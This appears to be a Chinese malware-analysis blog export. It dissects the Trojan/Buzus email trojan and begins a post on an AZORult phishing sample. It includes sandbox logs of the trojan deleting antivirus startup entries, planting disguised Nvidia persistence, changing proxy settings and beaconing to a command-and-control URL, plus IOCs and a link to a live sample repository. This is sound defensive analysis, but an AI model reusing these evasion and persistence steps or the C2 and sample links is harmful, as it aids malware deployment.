MD5：\tc1a5ba03f0ba9832cc87180a4c4622a5[virustotal] SHA1：\tb6c0f0588c8efffc48f308dfddecbf6170204dd9 壳或编译器信息：\t无匹配信息\n动态分析 前台无任何异常，进程看到子程序调用，rundll32.exe调用并处在运行，可看到触发报错告警。 可以观察到rundll32.exe调用plareb.dll运行命令： 通过行为分析复盘可以看到： document.exe再执行时开始创建调起进程：\"%Temp%\\NvMcTray.exe\" 查找删除防护软件注册表操作： 样本行为审计可以总结下完整的样本document.exe行为：document.exe运行创建%Temp%\\NvMcTray.exe和%Temp%\\NvTaskbarInit.exe（这个是受保护隐藏的备份），之后通过NvMcTray.exe进行正常流程调用rundll32.exe运行，删除英伟达注册表并新增额外启动项指向隐藏备份的释放文件NvTaskbarInit.exe，开启代理，删除防护软件启动项等操作。之后NvTaskbarInit.exe还会调用下载dll进行后续下载操作。 [CreateProcess] document.exe:2372 \u003e \"%UserProfile%\\Desktop\\document.exe\"\t[Child PID: 2856] [CreateProcess] document.exe:2856 \u003e \"%Temp%\\NvMcTray.exe\"\t[Child PID: 2968] [CreateFile] document.exe:2856 \u003e %LocalAppData%\\Temp\\1\\NvTaskbarInit.exe\t[SHA256: e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504] [CreateFile] document.exe:2856 \u003e %LocalAppData%\\Temp\\1\\NvTaskbarInit.exe\t[SHA256: e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504] [CreateFile] document.exe:2856 \u003e %LocalAppData%\\Temp\\1\\NvTaskbarInit.exe\t[SHA256: e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504] [CreateFile] document.exe:2856 \u003e %LocalAppData%\\Temp\\1\\NvTaskbarInit.exe\t[SHA256: e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504] [CreateFile] document.exe:2856 \u003e %LocalAppData%\\Temp\\1\\NvMcTray.exe\t[SHA256: 5877a70e36f1d51945837daae394da0275ca57e8acbb725fad992b454b7d16c6] [CreateFile] document.exe:2856 \u003e %LocalAppData%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\index.dat\t[SHA256: 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10] [CreateFile] document.exe:2856 \u003e %AppData%\\Microsoft\\Windows\\Cookies\\index.dat\t[SHA256: 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a] [CreateFile] document.exe:2856 \u003e %LocalAppData%\\Microsoft\\Windows\\History\\History.IE5\\index.dat\t[SHA256: 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c] [RegDeleteValue] document.exe:2856 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\AutoConfigURL [RegDeleteValue] document.exe:2856 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyOverride [RegDeleteValue] document.exe:2856 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\APVXDWIN [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\avast! [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AVG8_TRAY [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AVP [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\BDAgent [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\CAVRID [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\cctray [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\DrWebScheduler [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\egui [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\F-PROT Antivirus Tray application [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\ISTray [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\K7SystemTray [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\K7TSStart [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\McENUI [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\MskAgentexe [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\OfficeScanNT Monitor [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\RavTask [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\SBAMTray [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\sbamui [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\SCANINICIO [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\Spam Blocker for Outlook Express [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\SpamBlocker [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\SpIDerMail [RegDeleteValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Defender [RegSetValue] document.exe:2856 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\nvidia01 = 09 [RegSetValue] document.exe:2856 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\nvidia02 = 10 [RegSetValue] document.exe:2856 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable = 0 [RegSetValue] document.exe:2856 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Nvidia Control Center = C:\\Users\\LAB-WI~1\\AppData\\Local\\Temp\\1\\NvTaskbarInit.exe [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASAPI32\\ConsoleTracingMask = 4294901760 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASAPI32\\EnableConsoleTracing = 0 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASAPI32\\EnableFileTracing = 0 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASAPI32\\FileDirectory = %windir%\\tracing [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASAPI32\\FileTracingMask = 4294901760 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASAPI32\\MaxFileSize = 1048576 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASMANCS\\ConsoleTracingMask = 4294901760 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASMANCS\\EnableConsoleTracing = 0 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASMANCS\\EnableFileTracing = 0 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASMANCS\\FileDirectory = %windir%\\tracing [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASMANCS\\FileTracingMask = 4294901760 [RegSetValue] document.exe:2856 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\document_RASMANCS\\MaxFileSize = 1048576NvTaskbarInit.exe样本行为审计：释放plareb.dll到%LocalAppData%\\plareb.dll，调用rundll32.exe运行dll。\n[CreateProcess] NvMcTray.exe:2968 \u003e \"rundll32.exe %LocalAppData%\\plareb.dll,Startup\"\t[Child PID: 1584] [CreateFile] NvMcTray.exe:2968 \u003e %LocalAppData%\\plareb.dll\t[SHA256: c38239c98d9ba20e7af37cd7e516dc69d3accfaf699d9d517976f6cfeccb052c] [RegSetValue] NvMcTray.exe:2968 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Jyitoz\\Ekixeda = 42 01 30 03 41 05 40 07 3C 09 4F 0B 3E 0D 3E 0F(转码为：undefined) [RegSetValue] NvMcTray.exe:2968 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Jyitoz\\Yhukeb = 43 01 38 03 58 05 53 07 7B 09 6F 0B 7E 0D 7D 0F(转码为：undefined)rundll32.exe调用行为审计： rundll32.exe 运行%LocalAppData%\\efazufer.dll，运行_5b78e6e8a21a43cd8ced445ed9ca5ed30ca6835_0b3cf67e\\Report.wer，运行%LocalAppData%\\plareb.dll，修改注册表，修改cookie等。\n[CreateProcess] NvMcTray.exe:2968 \u003e \"rundll32.exe %LocalAppData%\\plareb.dll,Startup\"\t[Child PID: 1584] [CreateProcess] rundll32.exe:1584 \u003e \"rundll32.exe %LocalAppData%\\plareb.dll,iep\"\t[Child PID: 2616] [CreateProcess] rundll32.exe:1584 \u003e \"rundll32.exe %LocalAppData%\\plareb.dll,iep\"\t[Child PID: 2272] [CreateFolder] rundll32.exe:2616 \u003e %LocalAppData%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5 [CreateFile] rundll32.exe:2616 \u003e %LocalAppData%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\index.dat\t[SHA256: 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10] [CreateFolder] rundll32.exe:2616 \u003e %AppData%\\Microsoft\\Windows\\Cookies [CreateFile] rundll32.exe:2616 \u003e %AppData%\\Microsoft\\Windows\\Cookies\\index.dat\t[SHA256: 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a] [CreateFolder] rundll32.exe:2616 \u003e %LocalAppData%\\Microsoft\\Windows\\History\\History.IE5 [CreateFile] rundll32.exe:2616 \u003e %LocalAppData%\\Microsoft\\Windows\\History\\History.IE5\\index.dat\t[SHA256: 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c] [CreateFile] rundll32.exe:2616 \u003e %LocalAppData%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\BQES0LUV\\get2[1].htm\t[SHA256: f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0] [CreateFile] rundll32.exe:2616 \u003e %LocalAppData%\\efazufer.dll\t[SHA256: f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0] [CreateFile] WerFault.exe:2864 \u003e %LocalAppData%\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_rundll32.exe_5b78e6e8a21a43cd8ced445ed9ca5ed30ca6835_0b3cf67e\\Report.wer\t[SHA256: 33e3065cc7fe4f4a6c7b707fbef7a138a81cdc7906fcf2b565be5e91ec17ec08] [CreateFile] WerFault.exe:2864 \u003e %LocalAppData%\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_rundll32.exe_5b78e6e8a21a43cd8ced445ed9ca5ed30ca6835_0b3cf67e\\Report.wer\t[SHA256: 33e3065cc7fe4f4a6c7b707fbef7a138a81cdc7906fcf2b565be5e91ec17ec08] [CreateFolder] rundll32.exe:2272 \u003e %LocalAppData%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5 [CreateFile] rundll32.exe:2272 \u003e %LocalAppData%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\index.dat\t[SHA256: 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10] [CreateFolder] rundll32.exe:2272 \u003e %AppData%\\Microsoft\\Windows\\Cookies [CreateFile] rundll32.exe:2272 \u003e %AppData%\\Microsoft\\Windows\\Cookies\\index.dat\t[SHA256: 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a] [CreateFolder] rundll32.exe:2272 \u003e %LocalAppData%\\Microsoft\\Windows\\History\\History.IE5 [CreateFile] rundll32.exe:2272 \u003e %LocalAppData%\\Microsoft\\Windows\\History\\History.IE5\\index.dat\t[SHA256: 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c] [CreateFile] rundll32.exe:2272 \u003e %LocalAppData%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\YYP4M2G5\\get2[1].htm\t[SHA256: f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0] [CreateFile] rundll32.exe:2272 \u003e %LocalAppData%\\amamuwesebebe.dll\t[SHA256: f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0] [RegSetValue] rundll32.exe:1584 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Akiliyuwamo = rundll32.exe \"C:\\Users\\LAB-windows2008\\AppData\\Local\\plareb.dll\",Startup [RegSetValue] rundll32.exe:1584 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Jyitoz\\Sgayicelotef = 168 [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Jyitoz\\Yhukeb = 43 01 38 03 58 05 53 07 7B 09 6F 0B 7E 0D 7D 0F [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Jyitoz\\Jnaperote = 31 01 31 03 35 05 30 07 08 09 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASAPI32\\EnableFileTracing = 0 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASAPI32\\EnableConsoleTracing = 0 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASAPI32\\FileTracingMask = 4294901760 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASAPI32\\ConsoleTracingMask = 4294901760 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASAPI32\\MaxFileSize = 1048576 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASAPI32\\FileDirectory = %windir%\\tracing [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASMANCS\\EnableFileTracing = 0 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASMANCS\\EnableConsoleTracing = 0 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASMANCS\\FileTracingMask = 4294901760 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASMANCS\\ConsoleTracingMask = 4294901760 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASMANCS\\MaxFileSize = 1048576 [RegSetValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Tracing\\rundll32_RASMANCS\\FileDirectory = %windir%\\tracing [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable = 0 [RegDeleteValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer [RegDeleteValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyOverride [RegDeleteValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\AutoConfigURL [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings = 46 00 00 00 0A 00 00 00 09 00 00 00 00 00 00 00 [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\DefaultConnectionSettings = 46 00 00 00 06 00 00 00 09 00 00 00 00 00 00 00 [RegDeleteValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass [RegDeleteValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass [RegDeleteValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName [RegDeleteValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet = 0 [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect = 0 [RegDeleteValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass [RegDeleteValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass [RegDeleteValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName [RegDeleteValue] rundll32.exe:2616 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet = 0 [RegSetValue] rundll32.exe:2616 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect = 0 [RegSetValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Jyitoz\\Yhukeb = 43 01 38 03 58 05 53 07 7B 09 6F 0B 7E 0D 7D 0F [RegSetValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable = 0 [RegDeleteValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer [RegDeleteValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyOverride [RegDeleteValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\AutoConfigURL [RegSetValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings = 46 00 00 00 0B 00 00 00 09 00 00 00 00 00 00 00 [RegDeleteValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass [RegDeleteValue] rundll32.exe:2272 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass [RegDeleteValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName [RegDeleteValue] rundll32.exe:2272 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName [RegSetValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet = 0 [RegSetValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect = 0 [RegDeleteValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass [RegDeleteValue] rundll32.exe:2272 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass [RegDeleteValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName [RegDeleteValue] rundll32.exe:2272 \u003e HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName [RegSetValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet = 0 [RegSetValue] rundll32.exe:2272 \u003e HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect = 0网络行为发现连接大量域名IP，主要两处：\nwhatismyip.com/automation/n09230945.asp（确定本地IP地址） crl.microsoft/pki/crl/products/CSPCA.crl（校验.net证书） 081007e30903.lantzel.com/get2.php?c=CNEUQIGW\u0026d=26606B67393435363E2F676268307D3F222022222425243177757E4469747A224213131B1212151E0E5C434F116F1C6A76057701040172050A0D0309797F7F0C7304707A01707E767F7E0C7F7F6B2C263E2737216964606F7E31333F616E6A3A535155505243070305545A4D031E180A024C442C455329031B12474B4C4D4E47B6B0B6BABDA3F6F5E7EAB7F9F9E3EAE3FCA2A0BDF1EDF3B1F4FDABC4F9A0AFB9C3CDCCD7FBC09B978EDE9C9F919C88C98D8094C1898490D4D6DDD6869AD4DADEB4A4FFF2F6FDF0F6FEFCF8FFFDEB8B8082静态分析 情况基本一致不在赘述： IOCs: 文件hash 4e04c09cb0c3b3b2375d9e2e92a9e0e82f115c9011ca16a34cc83b4b94a730dc f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0 4e04c09cb0c3b3b2375d9e2e92a9e0e82f115c9011ca16a34cc83b4b94a730dc e53e796d032239c68fa1d485372c69d2232a4a269547f9da959d03f7ed448870 f5853afb6b66570e29fcf6cae815ffb001970e179d24f7739d2efedc317e0ead e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504 e117b82bd7c22e656f0e508dcd9ee7e4cf918cf9feacd170236eea67fd6a1984 f6846e5625a17d76a1a6e954ba67ee14896e0f7350030f5f61c3218b6463af4c 28619bf9a073ce5ade879ef7123c5a60f28bdfead6997c63540e1a5fede309e6 07854d2fef297a06ba81685e660c332de36d5d18d546927d30daad6d7fda1541 2454bcaae690d629420b45e7db2297269cd97ccb1bb2640401d23f0a1d9b5bcc e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504 5877a70e36f1d51945837daae394da0275ca57e8acbb725fad992b454b7d16c6 c38239c98d9ba20e7af37cd7e516dc69d3accfaf699d9d517976f6cfeccb052c 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0 33e3065cc7fe4f4a6c7b707fbef7a138a81cdc7906fcf2b565be5e91ec17ec08 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0\nHOST： 081007e30903.lantzel.com/get2.php?c=CNEUQIGW\u0026d=26606B67393435363E2F676268307D3F222022222425243177757E4469747A224213131B1212151E0E5C434F116F1C6A76057701040172050A0D0309797F7F0C7304707A01707E767F7E0C7F7F6B2C263E2737216964606F7E31333F616E6A3A535155505243070305545A4D031E180A024C442C455329031B12474B4C4D4E47B6B0B6BABDA3F6F5E7EAB7F9F9E3EAE3FCA2A0BDF1EDF3B1F4FDABC4F9A0AFB9C3CDCCD7FBC09B978EDE9C9F919C88C98D8094C1898490D4D6DDD6869AD4DADEB4A4FFF2F6FDF0F6FEFCF8FFFDEB8B8082 081007e30903.lantzel.com\n样本地址 https://github.com/XTpeeps/MalwareSamples/tree/master/Trojan_Buzus\n",
    "description": "",
    "tags": "恶意样本分析,实例",
    "title": "样本分析-Trojan/Buzus“霸族”木马通过邮件传播",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-TrojanBuzus%E9%9C%B8%E6%97%8F%E6%9C%A8%E9%A9%AC%E9%80%9A%E8%BF%87%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "样本分析记录",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/index.html"
  },
  {
    "content": "邮件恶意样本发现AZORult间谍软件传播 历史上AZORult家族为间谍软件在网上流传，上一次针对国内爆发的行动是在2018年7月18日，本次发现可能意味着其在国内行动仍然存在。针对此回连恶意域名的流量检索中未发现相关回链请求告警，意味着在流量范围内暂未发现相关成功行为。但不排除用户使用个人设备误点击触发漏洞在监控范围外。 恶意邮件样本 本次共发现7月30日至8月份样本 主题:Request for quotation PO No.021 发件人:Chvan chvan@free.fr 收件人:undisclosed-recipients:; 日期:Thu, 22 Aug 2019 04:40:29 -0700 相关信息:from sglinode-rsdnproxy-1.icoremail.net (unknown [91.228.7.139]) by c2mx2 (Coremail) with SMTP id DAENCgBXXQk4gF5dokH2Aw–.838S2; Thu, 22 Aug 2019 19:44:57 +0800 (CST) \u003c为防止泄密和保护隐私，已对邮件内容进行屏蔽\u003e quotation_PO_No.021.doc\n样本信息 hash:aac73d7cd77c0abb532db7cd70c1679bdbaca30c82386a67a504dd1299c8aa66 文件名 quotation_PO_No_021 文件大小 101.68kb 文件类型 rtf 文件md5信息 ee9f79e2dd1d0cc6134facdd4c9b9ec6 文件sha1信息 4eb319d14fe441bb2604d4f92e646d1f258ebfc2 文件sha256信息 aac73d7cd77c0abb532db7cd70c1679bdbaca30c82386a67a504dd1299c8aa66 文件ssdeep信息 96:c3KlZARvYj1HJcuL2hoykm7QvdfOguQy0DKteo:WKlOvYtBHmElOguQRKV 文件magic信息 Rich Text Format data, unknown version 文件trid信息 100.0% (.RTF) Rich Text Format (5000/1) 文件exiftool信息 ExifToolVersion:11.1 FileAccessDate:2019:09:02 14:49:26+08:00 FileInodeChangeDate:2019:09:02 14:49:26+08:00 FileModifyDate:2019:09:02 14:49:26+08:00 FileSize:102 kB 